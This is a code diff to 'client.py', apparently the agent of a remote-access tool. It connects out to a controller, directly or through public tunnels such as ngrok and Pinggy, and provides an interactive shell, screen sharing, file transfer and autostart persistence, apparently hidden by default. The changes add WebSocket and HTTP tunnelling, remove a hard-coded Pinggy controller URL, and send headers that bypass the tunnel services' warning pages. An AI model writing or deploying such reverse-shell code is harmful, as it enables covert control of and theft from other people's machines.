@@ -1,4 +1,7 @@
-# client.py - v19 (macOS, Android/Termux and iOS-aware; instant commands, fast
+# client.py - v20 (automatic TCP / HTTP / HTTPS; accepts a bare IP, host:port,
+#                   tcp://, tls://, http://, https://, or a full Pinggy/ngrok
+#                   URL; WebSocket first, then streaming HTTP, then half-duplex;
+#                   macOS, Android/Termux and iOS-aware; instant commands, fast
 #                   capture, persistent + shell, screen share in its own thread,
 #                   Ctrl+B background / Ctrl+Z kill, queued requests answered,
 #                   floods cut off not killed)
@@ -7,13 +10,16 @@ import atexit
 import base64
 import contextlib
 import errno
+import hashlib
 import importlib.util
 import io
+import ipaddress
 import json
 import os
 import platform
 import queue
 import re
+import secrets
 import select
 import shutil
 import signal
@@ -26,35 +32,52 @@ import sys
 import tempfile
 import threading
 import time
+from urllib.parse import quote, urlsplit
 
 # ---------------------------------------------------------------------------
-# Transport selection.  Edit this one line in BOTH files, exactly the same:
-#     tcp    raw TCP (the original, lowest overhead)
-#     http   an HTTP/1.1 chunked tunnel (works through HTTP-aware firewalls)
-#     https  the same tunnel inside TLS (HTTP/1.1 over TLS 1.2/1.3)
-# Both bare names and quoted strings are accepted: connection_type = http or
-# connection_type = 'http'.  HTTP/2 requires a separate HTTP/2 stack; this
-# implementation intentionally uses the standard-library HTTP/1.1 tunnel so
-# it runs on every supported Python (3.9+) without third-party modules.
+# Transport selection.  The client discovers the transport automatically; this
+# value is only the preferred family when the address has no scheme:
+#     auto   try the fastest/proper order for the address (recommended)
+#     tcp    prefer raw TCP on a LAN
+#     http   prefer plain HTTP
+#     https  prefer HTTPS (normal for Pinggy/ngrok URLs)
+# Both bare names and quoted strings are accepted.  The controller accepts all
+# of them on one port, so the two files never need matching values.
 # ---------------------------------------------------------------------------
+auto = 'auto'
 tcp = 'tcp'
 http = 'http'
 https = 'https'
-connection_type = https         # <- https / http / tcp
+connection_type = auto         # <- auto / https / http / tcp
 
-DEFAULT_IP = 'https://bmtoy-103-55-145-173.run.pinggy-free.link'
+DEFAULT_IP = '192.168.0.113'
 DEFAULT_PORT = 4444
 RETRY_DELAY = 1               # seconds between reconnect attempts
 CONNECT_TIMEOUT = 3           # seconds a TCP connect may take before we retry
 MAX_FILE = 50 * 1024 * 1024   # 50 MB
 MAX_MSG = 96 * 1024 * 1024    # sanity bound for one protocol message
 CONNECTION_TYPE = str(os.environ.get('TUNNEL_TYPE') or connection_type).strip().lower()
-VALID_CONNECTION_TYPES = ('tcp', 'http', 'https')
+VALID_CONNECTION_TYPES = ('auto', 'tcp', 'http', 'https')
 HTTP_HANDSHAKE_TIMEOUT = 10    # seconds for HTTP headers / TLS handshake
 HTTP_SEND_STALL_TIMEOUT = 10   # tolerate a slow-but-moving mobile link
 HTTP_MAX_HEADER = 32 * 1024    # reject an endless response header
 HTTP_MAX_LINE = 4096           # one chunk-size/trailer line
 HTTP_MAX_CHUNK = MAX_MSG       # one HTTP chunk cannot claim unlimited memory
+CMON_MAGIC = b'CMON2\n'
+CMON_ACK = b'CMON2 OK\n'
+CMON_MARKER_HEADER = 'X-CMon'
+CMON_MARKER_VALUE = '1'
+CMON_VERSION = '2'
+CMON_USER_AGENT = 'cmon-client/2'
+CMON_WS_PROTOCOL = 'cmon.v1'
+CMON_WS_MAX_FRAME = 512 * 1024
+CMON_WS_PING = 20.0
+CMON_WS_DEAD = 65.0
+TUNNEL_PROBE_TIMEOUT = 12.0
+HALF_UP_BATCH = 256 * 1024    # public tunnels may cap/buffer big POST bodies
+HALF_UP_TIMEOUT = 30          # seconds for one /up body through a slow tunnel
+CMON_TRANSPORT_CACHE = {'key': None, 'kind': None}
+CMON_TRANSPORT_LOCK = threading.Lock()
 MAX_OUTPUT = 8 * 1024 * 1024  # keep this much output; a flood is cut off, not killed
 SCREEN_SIZE = (960, 540)      # screen share frame size (width, height)
 SCREEN_JPEG_QUALITY = 70      # JPEG quality for streamed frames
@@ -397,6 +420,21 @@ def _tune_socket(sock):
             pass
 
 
+def _socket_pending(conn):
+    """Application bytes buffered above the kernel (TLS/adapters).
+
+    select() cannot see an SSLSocket's decrypted buffer; without this check a
+    complete hello_ack could appear to time out on a direct-TLS connection."""
+    for candidate in (conn, getattr(conn, 'raw', None)):
+        if candidate is None:
+            continue
+        try:
+            return int(candidate.pending())
+        except (AttributeError, OSError, ValueError):
+            continue
+    return 0
+
+
 def recv_exact(conn, n, stall=False, deadline=None):
     """Read exactly n bytes.
 
@@ -419,7 +457,7 @@ def recv_exact(conn, n, stall=False, deadline=None):
                 timeout = min(timeout, RECV_STALL_TIMEOUT)
         elif chunks or stall:
             timeout = RECV_STALL_TIMEOUT
-        if timeout is not None:
+        if timeout is not None and _socket_pending(conn) <= 0:
             readable, _, _ = select.select([conn], [], [], timeout)
             if not readable:
                 return None
@@ -1568,28 +1606,27 @@ def _recv_exact(sock, n):
     return buf
 
 
-def _connect_shell(host, port):
-    """Connect to the controller's shell channel, retrying for a short while.
+def _connect_shell(host, port, scheme='auto', token=None):
+    """Connect to the same public endpoint as the control link.
 
-    In tcp mode this is the controller's temporary listener.  In http/https
-    mode it is POST /shell on the main controller port, so no extra firewall
-    hole is needed."""
+    Raw TCP/TLS uses a second CMON2 handshake; HTTP/HTTPS/WebSocket uses
+    /shell.  The shell token from the control message authenticates the
+    channel even when a tunnel makes every connection look like 127.0.0.1.
+    """
     deadline = time.time() + SHELL_CONNECT_TIMEOUT
+    last_error = None
     while True:
         if SHELL_CANCEL.is_set():
             raise OSError('shell cancelled')
         try:
-            if CONNECTION_TYPE in ('http', 'https'):
-                sock = _http_connect(host, port, '/shell')
-            else:
-                # A short connect timeout keeps stop_shell() responsive while
-                # still retrying for the full SHELL_CONNECT_TIMEOUT window.
-                sock = socket.create_connection((host, port), timeout=1)
-        except OSError:
+            sock, _family, _variant = _open_controller_connection(
+                host, port, scheme, role='shell', token=token)
+        except Exception as e:
+            last_error = e
             if SHELL_CANCEL.is_set():
-                raise
+                raise OSError('shell cancelled')
             if time.time() >= deadline:
-                raise
+                raise OSError('could not open the shell channel: {}'.format(last_error))
             time.sleep(0.25)
             continue
         if SHELL_CANCEL.is_set():
@@ -1937,17 +1974,17 @@ def _shell_windows_pipes(sock):
             pass
 
 
-def _interactive_shell_thread(host, port):
+def _interactive_shell_thread(host, port, scheme='auto', token=None):
     """Background worker: run one interactive shell session for the controller."""
     sock = None
     try:
         if SHELL_CANCEL.is_set():
             return
         try:
-            sock = _connect_shell(host, port)
+            sock = _connect_shell(host, port, scheme, token)
         except OSError as e:
             if not SHELL_CANCEL.is_set():
-                print('[!] shell: could not reach the controller shell port: {}'.format(e))
+                print('[!] shell: could not reach the controller shell channel: {}'.format(e))
             return
         with SHELL_LOCK:
             if SHELL_CANCEL.is_set():
@@ -1989,7 +2026,8 @@ def _interactive_shell_thread(host, port):
         SHELL_BUSY.release()
 
 
-def start_interactive_shell(control_socket, host, port, req_id=None):
+def start_interactive_shell(control_socket, host, port, scheme='auto',
+                            token=None, req_id=None):
     """Handle a 'shell' request from the controller: one interactive shell,
     in the background, so the main command connection keeps working."""
     if not SHELL_BUSY.acquire(blocking=False):
@@ -2001,8 +2039,10 @@ def start_interactive_shell(control_socket, host, port, req_id=None):
             # A new shell request is a fresh session; clear a cancel left by
             # the previous control link before the worker can see it.
             SHELL_CANCEL.clear()
-            thread = threading.Thread(target=_interactive_shell_thread, args=(host, port),
-                                      name='interactive-shell', daemon=True)
+            thread = threading.Thread(
+                target=_interactive_shell_thread,
+                args=(host, port, scheme, token),
+                name='interactive-shell', daemon=True)
             SHELL_THREAD[0] = thread
         thread.start()
     except Exception as e:
@@ -3058,11 +3098,119 @@ def remove_autostart():
     return buf.getvalue().strip()
 
 
+def _looks_like_tunnel_host(host):
+    """Hosts whose bare name normally means a public HTTPS tunnel."""
+    value = (host or '').strip().lower().rstrip('.')
+    return any(value == suffix or value.endswith('.' + suffix) or
+               value.endswith(suffix)
+               for suffix in (
+                   'ngrok-free.app', 'ngrok-free.dev', 'ngrok.app',
+                   'ngrok.io', 'ngrok.dev',
+                   'pinggy.link', 'pinggy-free.link', 'pinggy.io',
+                   'pinggy.net', 'pinggy.online', 'pinggy.top',
+                   'trycloudflare.com', 'loca.lt', 'serveo.net',
+                   'localhost.run', 'bore.pub', 'tunnelmole.net',
+                   'telebit.cloud'))
+
+
+def _default_port_for_scheme(scheme, host=None):
+    scheme = (scheme or '').lower()
+    if scheme == 'http':
+        return 80
+    if scheme == 'https':
+        return 443
+    if scheme in ('ws', 'wss'):
+        return 80 if scheme == 'ws' else 443
+    if scheme == 'tls':
+        # Pinggy's tls:// tunnel URL has no port; its TLS listener is 443.
+        # A direct LAN TLS endpoint should normally include its port.
+        return 443
+    if scheme == 'tcp':
+        return DEFAULT_PORT
+    if host and _looks_like_tunnel_host(host):
+        return 443
+    return DEFAULT_PORT
+
+
+def _parse_address(raw, explicit_port=None):
+    """Turn anything a user or tunnel prints into (host, port, scheme).
+
+    Accepted forms:
+      192.168.1.20             host:4444
+      tcp://host:4444          tls://host:4444
+      http://host:4444/        https://name.ngrok-free.app
+      https://name.run.pinggy-free.link
+      [2001:db8::1]:4444       https://[2001:db8::1]:4444
+    A path is ignored because the controller's endpoints are fixed.
+    """
+    text = str(raw or '').strip()
+    if not text:
+        text = DEFAULT_IP
+    scheme = ''
+    host = ''
+    port = None
+    if '://' in text:
+        parsed = urlsplit(text)
+        scheme = (parsed.scheme or '').lower()
+        if scheme == 'ws':
+            scheme = 'http'
+        elif scheme == 'wss':
+            scheme = 'https'
+        if scheme not in ('tcp', 'tls', 'http', 'https', 'auto'):
+            raise ValueError('unsupported address scheme {!r}'.format(scheme))
+        host = parsed.hostname or ''
+        try:
+            port = parsed.port
+        except ValueError:
+            raise ValueError('invalid port in {!r}'.format(text))
+    else:
+        # Bracketed IPv6: [::1]:4444 or [::1]
+        if text.startswith('['):
+            end = text.find(']')
+            if end < 0:
+                raise ValueError('unclosed IPv6 address {!r}'.format(raw))
+            host = text[1:end]
+            rest = text[end + 1:]
+            if rest.startswith(':'):
+                port = int(rest[1:])
+        elif text.count(':') == 1:
+            host, possible_port = text.rsplit(':', 1)
+            if possible_port.isdigit():
+                port = int(possible_port)
+            else:
+                host = text
+        else:
+            host = text
+    host = (host or '').strip().strip('[]')
+    if not host:
+        raise ValueError('address has no host: {!r}'.format(raw))
+    if explicit_port is not None:
+        port = explicit_port
+    if port is None:
+        port = _default_port_for_scheme(scheme or (CONNECTION_TYPE
+                                                   if CONNECTION_TYPE != 'auto'
+                                                   else ''), host)
+    if not 0 < int(port) < 65536:
+        raise ValueError('port {} is out of range'.format(port))
+    if not scheme:
+        if CONNECTION_TYPE != 'auto':
+            scheme = CONNECTION_TYPE
+        elif _looks_like_tunnel_host(host) or port == 443:
+            scheme = 'https'
+        else:
+            scheme = 'auto'
+    return host, int(port), scheme
+
+
 def parse_args(argv):
-    """client.py [controller_ip] [controller_port]
-                [--persist | --remove-persist] [--visible] [--log-file PATH]"""
+    """client.py [address] [optional_port]
+                [--persist | --remove-persist] [--visible] [--log-file PATH]
+
+    The first positional argument may be a bare IP, host:port, or a full URL
+    printed by Pinggy/ngrok.  For compatibility a second positional integer is
+    still accepted as an explicit port override."""
     ip = DEFAULT_IP
-    port = DEFAULT_PORT
+    port_override = None
     persist = remove = visible = False
     log_file = None
     positional = []
@@ -3097,16 +3245,17 @@ def parse_args(argv):
         ip = positional[0]
     if len(positional) > 1:
         try:
-            port = int(positional[1])
+            port_override = int(positional[1])
         except ValueError:
-            sys.stderr.write('[!] {!r} is not a port number; using {}.\n'.format(
-                positional[1], DEFAULT_PORT))
-            port = DEFAULT_PORT
-    if not 0 < port < 65536:
-        sys.stderr.write('[!] Port {} is out of range; using {}.\n'.format(
-            port, DEFAULT_PORT))
-        port = DEFAULT_PORT
-    return ip, port, persist, remove, visible, log_file
+            sys.stderr.write('[!] {!r} is not a port number; ignoring it.\n'.format(
+                positional[1]))
+    try:
+        host, port, scheme = _parse_address(ip, port_override)
+    except (ValueError, OSError) as e:
+        sys.stderr.write('[!] Bad controller address {!r}: {}; using {}:{}.\n'.format(
+            ip, e, DEFAULT_IP, DEFAULT_PORT))
+        host, port, scheme = _parse_address(DEFAULT_IP)
+    return host, port, scheme, persist, remove, visible, log_file
 
 
 def _loopback_target(address):
@@ -3280,6 +3429,7 @@ class HttpTunnel(object):
     def __init__(self, raw, initial=b'', name='http-tunnel'):
         self.raw = raw
         self.name = name
+        _kernel_send_timeout(raw)
         self._in, self._out = socket.socketpair()
         self._in.settimeout(None)
         # The pump writes into the application side of the pair.  A one
@@ -3490,22 +3640,798 @@ class HttpTunnel(object):
                 pass
 
 
-def _client_tls_context():
-    """TLS 1.2/1.3 client context.
+class TransportNotSupported(OSError):
+    """This transport is not available at the address; try the next one."""
 
-    A self-signed certificate is accepted by default so the one-line switch
-    works out of the box.  Set CONTROLLER_TLS_VERIFY=1 (and optionally
-    CONTROLLER_TLS_CA=/path/ca.pem) for normal certificate verification."""
-    verify = (os.environ.get('CONTROLLER_TLS_VERIFY') or '').strip().lower()
-    verify = verify in ('1', 'true', 'yes', 'on')
+
+def _kernel_send_timeout(sock):
+    """Set SO_SNDTIMEO only (never the Python-wide socket timeout).
+
+    A blocking send on a dead proxy must not park a worker forever, while an
+    idle recv is perfectly normal.  Setting SO_SNDTIMEO leaves recv alone; the
+    adapters already catch socket.timeout and treat it as temporary no-progress.
+    """
+    try:
+        if os.name == 'nt':
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO,
+                            SEND_TIMEOUT * 1000)
+        else:
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDTIMEO,
+                            struct.pack('ll', SEND_TIMEOUT, 0))
+    except OSError:
+        pass
+
+
+class WebSocketTunnel(object):
+    """Socket-shaped duplex adapter over RFC 6455 binary frames (client side).
+
+    The implementation deliberately matches controller.py: binary frames carry
+    the unchanged stream, client frames are masked, server frames may be
+    unmasked, and ping/pong keeps middle boxes and mobile NATs alive.  It is
+    standard-library only, so it works on Python 3.9+ on every target OS.
+    """
+
+    def __init__(self, raw, server_side=False, initial=b'', name='websocket'):
+        self.raw = raw
+        self.server_side = server_side
+        self.name = name
+        _kernel_send_timeout(raw)
+        self._in, self._out = socket.socketpair()
+        self._in.settimeout(None)
+        self._out.settimeout(1.0)
+        try:
+            for sock in (self._in, self._out):
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 1024)
+        except OSError:
+            pass
+        self._buf = bytearray(initial)
+        self._send_lock = threading.Lock()
+        self._closed = False
+        self._resources_closed = False
+        self._write_closed = False
+        self._last_rx = time.monotonic()
+        self._next_ping = self._last_rx + CMON_WS_PING
+        try:
+            self.raw.settimeout(1.0)
+        except (AttributeError, OSError):
+            pass
+        self._reader = threading.Thread(target=self._pump,
+                                        name=name + '-reader', daemon=True)
+        self._reader.start()
+
+    def fileno(self):
+        return self._in.fileno()
+
+    def __getattr__(self, name):
+        return getattr(self._in, name)
+
+    def send(self, data):
+        if not data:
+            return 0
+        with self._send_lock:
+            if self._closed or self._write_closed:
+                raise OSError('WebSocket tunnel is closed')
+            try:
+                view = memoryview(data)
+                while view:
+                    piece = view[:CMON_WS_MAX_FRAME]
+                    self._raw_send(self._frame(piece, 0x2))
+                    view = view[len(piece):]
+            except OSError:
+                self._broken()
+                raise
+        return len(data)
+
+    def sendall(self, data):
+        self.send(data)
+
+    def _frame(self, payload, opcode):
+        payload = bytes(payload)
+        length = len(payload)
+        if length > MAX_MSG:
+            raise OSError('WebSocket frame is too large')
+        first = 0x80 | (opcode & 0x0f)
+        mask_bit = 0x00 if self.server_side else 0x80
+        if length < 126:
+            header = struct.pack('!BB', first, mask_bit | length)
+        elif length < 65536:
+            header = struct.pack('!BBH', first, mask_bit | 126, length)
+        else:
+            header = struct.pack('!BBQ', first, mask_bit | 127, length)
+        if self.server_side:
+            return header + payload
+        mask = os.urandom(4)
+        return header + mask + _ws_apply_mask(payload, mask)
+
+    def _end_write(self):
+        with self._send_lock:
+            if self._closed or self._write_closed:
+                return
+            self._write_closed = True
+            try:
+                self._raw_send(self._frame(b'', 0x8))
+            except OSError:
+                self._broken()
+
+    def shutdown(self, how):
+        if how in (socket.SHUT_WR, socket.SHUT_RDWR):
+            self._end_write()
+        if how in (socket.SHUT_RD, socket.SHUT_RDWR):
+            try:
+                self._in.shutdown(socket.SHUT_RD)
+            except OSError:
+                pass
+
+    def close(self):
+        self._closed = True
+        self._end_write()
+        if self._resources_closed:
+            return
+        self._resources_closed = True
+        try:
+            self.raw.shutdown(socket.SHUT_RDWR)
+        except OSError:
+            pass
+        try:
+            self.raw.close()
+        except OSError:
+            pass
+        for sock in (self._in, self._out):
+            try:
+                sock.shutdown(socket.SHUT_RDWR)
+            except OSError:
+                pass
+            try:
+                sock.close()
+            except OSError:
+                pass
+
+    def _broken(self):
+        self._closed = True
+        try:
+            self.raw.shutdown(socket.SHUT_RDWR)
+        except OSError:
+            pass
+
+    def _raw_send(self, data):
+        view = memoryview(data)
+        last_progress = time.time()
+        while view:
+            try:
+                sent = self.raw.send(view)
+            except (socket.timeout, TimeoutError):
+                if time.time() - last_progress > HTTP_SEND_STALL_TIMEOUT:
+                    raise OSError('WebSocket send stalled')
+                time.sleep(0.02)
+                continue
+            if sent <= 0:
+                raise OSError('WebSocket closed while sending')
+            view = view[sent:]
+            last_progress = time.time()
+
+    def _send_control(self, opcode, payload=b''):
+        with self._send_lock:
+            if self._closed:
+                return
+            try:
+                self._raw_send(self._frame(payload, opcode))
+            except OSError:
+                self._broken()
+
+    def _raw_read(self, n):
+        while len(self._buf) < n:
+            if self._closed:
+                raise ConnectionError('WebSocket tunnel closed')
+            now = time.monotonic()
+            if now >= self._next_ping:
+                self._next_ping = now + CMON_WS_PING
+                self._send_control(0x9, b'cmon')
+            if now - self._last_rx > CMON_WS_DEAD:
+                raise OSError('WebSocket peer stopped answering')
+            try:
+                chunk = self.raw.recv(65536)
+            except (socket.timeout, TimeoutError):
+                continue
+            if not chunk:
+                raise ConnectionError('WebSocket tunnel closed')
+            self._buf += chunk
+            self._last_rx = time.monotonic()
+        data = bytes(self._buf[:n])
+        del self._buf[:n]
+        return data
+
+    def _write_local(self, data):
+        view = memoryview(data)
+        while view:
+            try:
+                sent = self._out.send(view)
+            except (socket.timeout, TimeoutError):
+                if self._closed:
+                    raise ConnectionError('WebSocket tunnel closed')
+                continue
+            if sent <= 0:
+                raise ConnectionError('WebSocket tunnel closed')
+            view = view[sent:]
+
+    def _read_frame(self):
+        first, second = struct.unpack('!BB', self._raw_read(2))
+        opcode = first & 0x0f
+        masked = bool(second & 0x80)
+        length = second & 0x7f
+        if length == 126:
+            length = struct.unpack('!H', self._raw_read(2))[0]
+        elif length == 127:
+            length = struct.unpack('!Q', self._raw_read(8))[0]
+        if length > MAX_MSG:
+            raise OSError('WebSocket peer sent an oversized frame')
+        mask = self._raw_read(4) if masked else b''
+        payload = self._raw_read(length) if length else b''
+        if masked:
+            payload = _ws_apply_mask(payload, mask)
+        self._last_rx = time.monotonic()
+        return opcode, payload
+
+    def _pump(self):
+        try:
+            while not self._closed:
+                opcode, payload = self._read_frame()
+                if opcode == 0x8:
+                    self._send_control(0x8, payload[:125])
+                    break
+                if opcode == 0x9:
+                    self._send_control(0xa, payload[:125])
+                    continue
+                if opcode == 0xa:
+                    continue
+                if opcode in (0x0, 0x1, 0x2) and payload:
+                    self._write_local(payload)
+        except (OSError, ValueError, ConnectionError, struct.error):
+            pass
+        finally:
+            try:
+                self._out.shutdown(socket.SHUT_WR)
+            except OSError:
+                pass
+
+
+def _ws_apply_mask(data, mask):
+    """Byte-wise RFC 6455 XOR using one big-integer operation.
+
+    A Python per-byte loop (and even a per-32-bit-word loop) was the limiting
+    factor for downloads.  int.from_bytes/xor/to_bytes runs in C and keeps the
+    same bytewise semantics on little- and big-endian hosts.  WebSocket frames
+    are already split to CMON_WS_MAX_FRAME by send(), so this stays bounded.
+    """
+    if not data:
+        return b''
+    if len(mask) != 4:
+        raise OSError('invalid WebSocket mask')
+    length = len(data)
+    pattern = mask * (length // 4) + mask[:length % 4]
+    return (int.from_bytes(data, 'big') ^
+            int.from_bytes(pattern, 'big')).to_bytes(length, 'big')
+
+def _ws_accept_value(key):
+    return base64.b64encode(hashlib.sha1(
+        (key + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11').encode('ascii')).digest()).decode('ascii')
+
+
+def _host_header(host, port):
+    value = str(host)
+    if ':' in value and not value.startswith('['):
+        value = '[{}]'.format(value)
+    return '{}:{}'.format(value, port)
+
+
+def _tunnel_headers(host, token=None, role='control'):
+    headers = [
+        'User-Agent: {}'.format(CMON_USER_AGENT),
+        'Accept: */*',
+        'Cache-Control: no-store',
+        # Both free tunnel services show a one-time browser page only to
+        # browser-like clients.  A non-browser User-Agent plus these documented
+        # opt-out headers keeps the raw protocol untouched.
+        'ngrok-skip-browser-warning: 1',
+        'X-Pinggy-No-Screen: 1',
+        'X-CMon-Role: {}'.format(role),
+    ]
+    if token:
+        headers.append('X-CMon-Token: {}'.format(token))
+    return headers
+
+
+def _ws_connect(host, port, path='/tunnel', use_tls=True, token=None):
+    """Open a WebSocket tunnel to the controller or tunnel edge."""
+    sock = _connect_target(host, port)
+    try:
+        _tune_socket(sock)
+        if use_tls:
+            sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
+            sock = _wrap_client_tls(sock, host)
+            try:
+                selected = sock.selected_alpn_protocol()
+            except (AttributeError, NotImplementedError, OSError):
+                selected = None
+            if selected not in (None, 'http/1.1'):
+                raise TransportNotSupported(
+                    'TLS negotiated {!r}; this tunnel uses HTTP/1.1'.format(selected))
+        key = base64.b64encode(os.urandom(16)).decode('ascii')
+        query = ''
+        if token:
+            query = '?token=' + quote(token, safe='')
+        lines = [
+            'GET {}{} HTTP/1.1'.format(path, query),
+            'Host: {}'.format(_host_header(host, port)),
+            'Upgrade: websocket',
+            'Connection: Upgrade',
+            'Sec-WebSocket-Key: {}'.format(key),
+            'Sec-WebSocket-Version: 13',
+            'Sec-WebSocket-Protocol: {}'.format(CMON_WS_PROTOCOL),
+        ]
+        lines.extend(_tunnel_headers(host, token))
+        lines.append('')
+        lines.append('')
+        sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
+        sock.sendall('\r\n'.join(lines).encode('latin-1'))
+        head, extra = _read_http_head(sock)
+        parts = head.split('\r\n')
+        status = parts[0].split(None, 2) if parts else []
+        if len(status) < 2:
+            raise TransportNotSupported('malformed WebSocket response')
+        try:
+            code = int(status[1])
+        except ValueError:
+            raise TransportNotSupported('malformed WebSocket status')
+        if code != 101:
+            raise TransportNotSupported(
+                'WebSocket upgrade returned HTTP {} {}'.format(
+                    code, status[2] if len(status) > 2 else ''))
+        headers = _http_headers(parts[1:])
+        if headers.get('sec-websocket-accept', '') != _ws_accept_value(key):
+            raise TransportNotSupported('incorrect Sec-WebSocket-Accept')
+        selected = headers.get('sec-websocket-protocol', '')
+        if selected and selected != CMON_WS_PROTOCOL:
+            raise TransportNotSupported(
+                'WebSocket subprotocol {!r} is not supported'.format(selected))
+        sock.settimeout(None)
+        return WebSocketTunnel(sock, server_side=False, initial=extra,
+                               name='ws-' + path.strip('/'))
+    except Exception:
+        try:
+            sock.close()
+        except OSError:
+            pass
+        raise
+
+
+def _http_connect(host, port, path='/tunnel', use_tls=True, token=None):
+    """Open one streaming HTTP/1.1 tunnel (POST request body + chunked reply)."""
+    sock = _connect_target(host, port)
+    try:
+        _tune_socket(sock)
+        if use_tls:
+            sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
+            sock = _wrap_client_tls(sock, host)
+            try:
+                selected = sock.selected_alpn_protocol()
+            except (AttributeError, NotImplementedError, OSError):
+                selected = None
+            if selected not in (None, 'http/1.1'):
+                raise TransportNotSupported(
+                    'TLS negotiated {!r}; this tunnel uses HTTP/1.1'.format(selected))
+        request = [
+            'POST {} HTTP/1.1'.format(path),
+            'Host: {}'.format(_host_header(host, port)),
+            'Content-Type: application/octet-stream',
+            'Transfer-Encoding: chunked',
+            'Connection: keep-alive',
+        ]
+        request.extend(_tunnel_headers(host, token))
+        request.extend(['', ''])
+        sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
+        sock.sendall('\r\n'.join(request).encode('latin-1'))
+        head, extra = _read_http_head(sock)
+        lines = head.split('\r\n')
+        if not lines:
+            raise TransportNotSupported('empty HTTP response')
+        status = lines[0].split(None, 2)
+        if len(status) < 2:
+            raise TransportNotSupported('malformed HTTP status line: {!r}'.format(lines[0]))
+        try:
+            code = int(status[1])
+        except ValueError:
+            raise TransportNotSupported('malformed HTTP status code')
+        if code != 200:
+            raise TransportNotSupported('controller returned HTTP {} {}'.format(
+                code, status[2] if len(status) > 2 else ''))
+        headers = _http_headers(lines[1:])
+        transfer_tokens = [item.strip() for item in
+                           headers.get('transfer-encoding', '').lower().split(',')
+                           if item.strip()]
+        if (not transfer_tokens or transfer_tokens[-1] != 'chunked'
+                or any(item not in ('identity', 'chunked')
+                       for item in transfer_tokens[:-1])):
+            raise TransportNotSupported('controller response is not chunked')
+        encoding = headers.get('content-encoding', '').strip().lower()
+        if encoding not in ('', 'identity'):
+            raise TransportNotSupported(
+                'controller/proxy compressed the tunnel ({})'.format(encoding))
+        sock.settimeout(None)
+        return HttpTunnel(sock, extra, name='http-' + path.strip('/'))
+    except Exception:
+        try:
+            sock.close()
+        except OSError:
+            pass
+        raise
+
+
+class _BodyStream(object):
+    """Minimal HTTP response-body reader for chunked or close-delimited bodies."""
+
+    def __init__(self, sock, headers, initial=b''):
+        self.sock = sock
+        # wire holds undecoded HTTP bytes (chunk sizes/CRLF); body holds only
+        # application bytes.  Keeping them separate avoids reordering a chunk
+        # when recv() returns the next chunk header in the same packet.
+        self.wire = bytearray(initial)
+        self.body = bytearray()
+        tokens = [item.strip().lower() for item in
+                  headers.get('transfer-encoding', '').split(',') if item.strip()]
+        self.chunked = bool(tokens and tokens[-1] == 'chunked')
+        self.eof = False
+
+    def _recv(self, size=65536, timeout=None):
+        if timeout is not None:
+            self.sock.settimeout(timeout)
+        try:
+            return self.sock.recv(size)
+        finally:
+            if timeout is not None:
+                try:
+                    self.sock.settimeout(None)
+                except OSError:
+                    pass
+
+    def _line(self):
+        while b'\r\n' not in self.wire:
+            if len(self.wire) > HTTP_MAX_LINE:
+                raise OSError('HTTP body line is too large')
+            chunk = self._recv(timeout=CMON_WS_DEAD)
+            if not chunk:
+                raise OSError('HTTP body ended early')
+            self.wire += chunk
+        line, _sep, rest = self.wire.partition(b'\r\n')
+        self.wire = bytearray(rest)
+        return bytes(line)
+
+    def _need_wire(self, n):
+        while len(self.wire) < n:
+            chunk = self._recv(timeout=CMON_WS_DEAD)
+            if not chunk:
+                raise OSError('HTTP body ended early')
+            self.wire += chunk
+
+    def _more(self):
+        if self.eof:
+            return False
+        if not self.chunked:
+            chunk = self._recv(timeout=CMON_WS_DEAD)
+            if not chunk:
+                self.eof = True
+                return False
+            self.body += chunk
+            return True
+        line = self._line()
+        while not line and not self.eof:
+            line = self._line()
+        try:
+            size = int(line.split(b';', 1)[0].strip(), 16)
+        except ValueError:
+            raise OSError('invalid HTTP chunk size')
+        if size < 0 or size > HTTP_MAX_CHUNK:
+            raise OSError('HTTP chunk is too large')
+        if size == 0:
+            while True:
+                trailer = self._line()
+                if not trailer:
+                    break
+            self.eof = True
+            return False
+        self._need_wire(size + 2)
+        self.body += self.wire[:size]
+        del self.wire[:size]
+        if self.wire[:2] != b'\r\n':
+            raise OSError('missing HTTP chunk terminator')
+        del self.wire[:2]
+        return True
+
+    def read(self, n):
+        while len(self.body) < n and not self.eof:
+            if not self._more():
+                break
+        data = bytes(self.body[:n])
+        del self.body[:n]
+        return data
+
+    def read_exact(self, n):
+        data = self.read(n)
+        if len(data) != n:
+            raise OSError('HTTP body ended early')
+        return data
+
+
+class HalfTunnelClient(object):
+    """Client-side socket-shaped adapter for the portable two-request fallback."""
+
+    def __init__(self, down_sock, reader, session_id, host, port, use_tls,
+                 role='control', token=None):
+        self.down_sock = down_sock
+        self.reader = reader
+        self.session_id = session_id
+        self.host = host
+        self.port = port
+        self.use_tls = use_tls
+        self.role = role
+        self.token = token
+        self._in, self._out = socket.socketpair()
+        self._in.settimeout(None)
+        self._out.settimeout(1.0)
+        try:
+            for sock in (self._in, self._out):
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 1024)
+        except OSError:
+            pass
+        self.up_q = queue.Queue(maxsize=128)
+        self._closed = False
+        self._write_closed = False
+        self._resources_closed = False
+        self._down_thread = threading.Thread(
+            target=self._down_loop, name='half-down-client', daemon=True)
+        self._up_thread = threading.Thread(
+            target=self._up_loop, name='half-up-client', daemon=True)
+        self._down_thread.start()
+        self._up_thread.start()
+
+    def fileno(self):
+        return self._in.fileno()
+
+    def __getattr__(self, name):
+        return getattr(self._in, name)
+
+    def send(self, data):
+        if not data:
+            return 0
+        if self._closed or self._write_closed:
+            raise OSError('half-duplex tunnel is closed')
+        try:
+            self.up_q.put(bytes(data), timeout=30)
+        except queue.Full:
+            raise OSError('half-duplex send queue is full')
+        return len(data)
+
+    def sendall(self, data):
+        self.send(data)
+
+    def shutdown(self, how):
+        if how in (socket.SHUT_WR, socket.SHUT_RDWR):
+            if not self._write_closed:
+                self._write_closed = True
+                try:
+                    self.up_q.put_nowait(None)
+                except queue.Full:
+                    pass
+        if how in (socket.SHUT_RD, socket.SHUT_RDWR):
